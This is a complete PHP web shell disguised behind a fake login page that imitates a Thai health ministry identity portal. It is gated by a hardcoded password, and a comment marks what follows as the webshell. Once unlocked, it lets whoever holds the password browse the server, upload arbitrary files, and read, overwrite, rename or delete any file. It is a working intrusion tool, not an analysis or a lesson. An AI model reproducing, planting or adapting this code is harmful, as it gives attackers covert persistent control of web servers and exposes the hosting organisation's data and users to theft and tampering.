<?php
session_start();
$domain = explode('.', $_SERVER['HTTP_HOST'])[0];
$password = "asepexploitsgantengbangetgan";

if (!isset($_SESSION['login_ok'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['login_ok'] = true;
        header("Location: ?");
        exit;
    }

    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Login</title>
    <style>
    body { margin:0; background:#f2f2f2; font-family:tahoma, sans-serif; }
    .window {
        width: 500px;
        margin: 80px auto;
        border: 1px solid #ccc;
        box-shadow: 0 0 10px #999;
        background: white;
        border-radius: 4px;
    }
    .title-bar {
        background: #e5e5f5;
        padding: 6px 10px;
        font-weight: bold;
        color: black;
        border-bottom: 1px solid #999;
    }
    .content {
        padding: 15px;
        display: flex;
        gap: 20px;
    }
    .logo {
        width: 120px;
        height: 120px;
    }
    .form {
        flex: 1;
        font-size: 14px;
    }
    select, input[type=password] {
        width: 100%;
        padding: 5px;
        margin: 6px 0;
        font-size: 14px;
    }
    .footer {
        padding: 10px;
        background: #f5f5f5;
        border-top: 1px solid #ccc;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .btn {
        padding: 5px 12px;
        font-size: 14px;
        border: 1px solid #ccc;
        border-radius: 3px;
        cursor: pointer;
    }
    .ok { background: #dff0d8; color: #3c763d; }
    .cancel { background: #f2dede; color: #a94442; }
    .top-label {
        font-weight: bold;
        font-size: 16px;
    }
    .login-labels {
        margin-top: 8px;
    }
    .ipport {
        font-size: 12px; color: #444; margin-bottom: 10px;
    }
    .link1 { color: red; }
    .link2 { color: green; }
    .link3 { color: purple; }
    </style>
    </head><body>
    <div class="window">
        <div class="title-bar">Login</div>
        <div class="top-label" style="padding: 10px;">
            <span class="link3">' . htmlspecialchars($domain) . ' IDP Center</span> | 
            <span class="link1">Login</span> 
            <span class="link2">' . htmlspecialchars($domain) . ' Account</span><br>
            <span class="ipport">192.168.86.5 : 16004</span>
        </div>
        <form method="post">
        <div class="content">
            <div><img class="logo" src="https://phr1.moph.go.th/idpadmin/cache/bmsmophidpwebapplication_exe/20224036jxlJJZPnrfeLkW111573257/__55D904DEF45D0B844A388691.png"></div>
            <div class="form">
                <label>หน่วยงาน</label><br>
                <select><option>' . htmlspecialchars($domain) . '</option></select>
                <div class="login-labels">
                    <label>User</label><br><input type="text" value="---" disabled>
                </div>
                <div class="login-labels">
                    <label>Password</label><br><input type="password" name="pass">
                </div>
                <div class="login-labels"><input type="checkbox"> Auto Login</div>
            </div>
        </div>
        <div class="footer">
            <div></div>
            <div>
                <button type="submit" class="btn ok">✔ ตกลง</button>
                <button type="button" class="btn cancel" onclick="window.close()">✘ ปิด</button>
            </div>
        </div>
        </form>
    </div>
    </body></html>';
    exit;
}

// Setelah login sukses, bisa lanjut ke webshell atau dashboard lain
echo "<h2>Selamat datang, akses diterima.</h2>";


$z = $_GET['z'] ?? getcwd();
if (!is_dir($z)) $z = getcwd();
chdir($z);

if (isset($_POST['__ren']) && isset($_POST['__to'])) {
    @rename($_POST['__ren'], $_POST['__to']);
}
if (isset($_GET['r'])) {
    $t = $_GET['r'];
    is_file($t) ? @unlink($t) : @rmdir($t);
    header("Location: ?z=" . urlencode($z));
    exit;
}
if ($_FILES) {
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}
if (isset($_GET['e'])) {
    if (isset($_POST['x'])) {
        file_put_contents($_GET['e'], $_POST['x']);
        header("Location: ?z=" . urlencode($z));
        exit;
    }
    $c = @file_get_contents($_GET['e']);
    echo "<form method='post'><h3>🔧 ".htmlspecialchars($_GET['e'])."</h3>
    <textarea name='x' style='width:100%;height:300px'>".htmlspecialchars($c)."</textarea><br>
    <input type='submit' value='บันทึก'></form>"; exit;
}

function p($f){
    $p = fileperms($f);
    return ($p&0x0100?'r':'').($p&0x0080?'w':'').($p&0x0040?'x':'');
}
function h($x){return htmlspecialchars($x, ENT_QUOTES);}
echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>ระบบ</title><style>
body{font-family:sans-serif;background:#fafafa;margin:0;padding:20px;color:#333}
table{width:100%;border-collapse:collapse;margin-top:10px}
td,th{padding:6px;border-bottom:1px solid #ddd;font-size:13px}
a{text-decoration:none;color:#0073aa}
form.inline{display:inline}
input[type=text]{padding:2px;width:140px}
input[type=file]{font-size:13px}
</style></head><body>";
echo "<h3>📦 <code>".h(realpath($z))."</code></h3>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='f'><input type='submit' value='อัปโหลด'>
</form>";
echo "<table><tr><th>ชื่อ</th><th>ขนาด</th><th>สิทธิ์</th><th>การทำงาน</th></tr>";
foreach(array_diff(scandir('.'),['.','..']) as $x){
    $f = realpath($x); $d = is_dir($x);
    echo "<tr><td>".($d?"📁 <a href='?z=".urlencode($f)."'>".h($x)."</a>":"📄 ".h($x))."</td>";
    echo "<td>".($d?"-":filesize($x)." B")."</td>";
    echo "<td>".p($x)."</td><td>";
    echo "<form class='inline' method='post'>
    <input type='hidden' name='__ren' value='".h($x)."'>
    <input type='text' name='__to' value='".h($x)."'>
    <input type='submit' value='↺'>
    </form> ";
    if (!$d) echo "<a href='?z=".urlencode($z)."&e=".urlencode($x)."'>📝</a> ";
    echo "<a href='?z=".urlencode($z)."&r=".urlencode($x)."' onclick='return confirm(\"ลบ ".h($x)."?\")'>🗑️</a>";
    echo "</td></tr>";
}
echo "</table></body></html>";
